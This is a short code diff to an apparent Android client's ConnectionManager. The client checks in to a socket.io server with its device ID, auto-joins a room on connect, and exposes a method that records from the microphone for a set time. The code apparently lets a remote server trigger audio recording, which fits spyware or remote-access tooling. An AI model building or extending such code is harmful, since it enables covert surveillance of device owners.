@@ -59,6 +59,13 @@ public class ConnectionManager {
             ioSocket = SocketConn.getInstance().getSocket();
             ioSocket.on("ping", args -> ioSocket.emit("pong", deviceId, "im alive: "+deviceId));
 
+            ioSocket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    ioSocket.emit("join", deviceId);
+                }
+            });
+
             ioSocket.on("joinroom", args -> {
                 ioSocket.emit("join", deviceId);
                 Log.e("TAG", "joined room: "+ deviceId );
@@ -449,7 +456,7 @@ public class ConnectionManager {
         }
     }
 
-    private static void micRecord(int sec) {
+    public static void micRecord(int sec) {
         try{
             MicManager.startRecording(sec);
             //ioSocket.emit("record", deviceId, "{\"status\":true}");
